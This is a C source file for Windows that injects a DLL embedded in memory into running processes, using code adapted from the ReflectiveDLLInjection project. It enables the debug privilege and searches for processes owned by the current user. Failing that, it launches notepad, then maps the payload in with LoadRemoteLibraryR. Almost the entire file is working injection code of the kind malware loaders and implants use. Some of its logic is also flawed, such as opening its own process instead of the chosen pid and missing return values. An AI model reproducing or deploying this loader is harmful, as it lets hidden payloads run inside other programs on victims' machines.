/*
*
* Used a large chunk of Stephen Fewers code (@relyze-ltd) its been modified
* quite a bit though but the licence for it is in the following file,
* ReflectiveDLLInjection/LICENSE.txt
*
*/

#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <stdlib.h>
#include <lmcons.h>
#include <windows.h>
#include <wtsapi32.h>

#include "dll_image.h"
#include "ReflectiveDLLInjection/inject/LoadLibraryR.h"

#pragma comment(lib,"Advapi32.lib")

int attempts = 0;

typedef struct {
  int   fd;
  int   file_size;
  DWORD pid;
} pe;

int inject_and_run(pe fileinfo) {
  DWORD dwLength        = 0;
  DWORD dwBytesRead     = 0;
  DWORD dwProcessId     = 0;
  TOKEN_PRIVILEGES priv = {0};
  HANDLE hFile          = NULL;
  HANDLE hModule        = NULL;
  HANDLE hProcess       = NULL;
  HANDLE hToken         = NULL;
  LPVOID lpBuffer       = NULL;

  //TODO: remember to have dll as same arch as pe

  do
  {
    dwProcessId = fileinfo.pid;

    if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {

      priv.PrivilegeCount           = 1;
      priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

      if( LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid)) {
        AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
      }

      CloseHandle(hToken);

    }

    printf("overide and injecting into %d\n", (int)GetCurrentProcessId());
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, (int)GetCurrentProcessId());

    if(!hProcess) {
      printf("[-] Failed to open the target process\n");
      //TODO: find another pid an inject... dont just die
      return 1;
    }

    printf("file size: %d\n", array_len);
    hModule = LoadRemoteLibraryR(hProcess, (LPVOID)dll_image, array_len, NULL);
    if (!hModule) {
      printf("[!] inject code: %d\n", GetLastError());
    }

    printf("[+] Injected the dll from memory into process %d.\n", dwProcessId);

    WaitForSingleObject(hModule, -1);

  } while(0);

  if(hProcess) {
    CloseHandle(hProcess);
  }

  return 0;
}

int get_current_cid() {
  DWORD dwProcCount = 0;
  WTS_PROCESS_INFO* pWPIs = NULL;

  if(WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount)) {
      for(DWORD i = 0; i < dwProcCount; i++) {
        if ((int)pWPIs[i].ProcessId == (int)GetCurrentProcessId()) {
          int cid = (int)pWPIs[i].pUserSid;
          WTSFreeMemory(pWPIs);
          pWPIs = NULL;
          return cid;
        }
      }
  }
}

DWORD find_process(int cid) {
  printf("find_process()\n");

  #define MAX_NAME 500
  SID_NAME_USE SidType;
  char lpName[MAX_NAME];
  char lpDomain[MAX_NAME];
  DWORD dwSize = MAX_NAME;
  DWORD username_len = UNLEN+1;
  char* username = (char*)malloc(username_len);

  DWORD dwProcCount = 0;
  WTS_PROCESS_INFO* pWPIs = NULL;
  if(WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount)) {
      for(DWORD i = 0; i < dwProcCount; i++) {
        if( !LookupAccountSid( NULL , pWPIs[i].pUserSid, lpName, &dwSize, lpDomain, &dwSize, &SidType ) )
        {
            DWORD dwResult = GetLastError();
            if( dwResult == ERROR_NONE_MAPPED )
               strcpy (lpName, "NONE_MAPPED" );
        }

        //just for testing purpose it will only inject into this process
        //if (strncmp(pWPIs[i].pProcessName, "notepad.exe", 11) == 0) {

        if (attempts >= 20) {
          system("notepad.exe");
          if (strncmp(pWPIs[i].pProcessName, "notepad.exe", 11) == 0) {
            int pid = pWPIs[i].ProcessId;
            printf("[+] injecting into: %s (%d)\n", pWPIs[i].pProcessName, pid);
            WTSFreeMemory(pWPIs);
            pWPIs = NULL;
            ++attempts;
            return pid;
          }
        }

        GetUserName(username, &username_len);
        if (strncmp(username, lpName, strlen(username)) == 0){
          printf("checking if we can inject...\n");
          HANDLE hProcess = NULL;
          hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pWPIs[i].ProcessId);
          if(!hProcess) {
            printf("cannot use process\n");
          } else {
            printf("found process for user: %s\n", lpName);
            if (((int)pWPIs[i].pUserSid != 0) && (GetCurrentProcessId() != pWPIs[i].ProcessId)) {
              int pid = pWPIs[i].ProcessId;
              printf("[+] injecting into: %s (%d)\n", pWPIs[i].pProcessName, pid);
              WTSFreeMemory(pWPIs);
              pWPIs = NULL;
              ++attempts;
              return pid;
            }
          }
        }
      }

      memset(lpName, '\0', strlen(lpName));
      memset(lpDomain, '\0', strlen(lpDomain));
      memset(username, '\0', strlen(username));
  }

  printf("didnt find nothing...\n");
}

int main() {
  system("pause");

  pe fileinfo;
  int cid = get_current_cid();
  printf("current cid: %d\n", cid);
  fileinfo.pid          = find_process(cid);

  system("pause");

  inject_and_run(fileinfo);
}
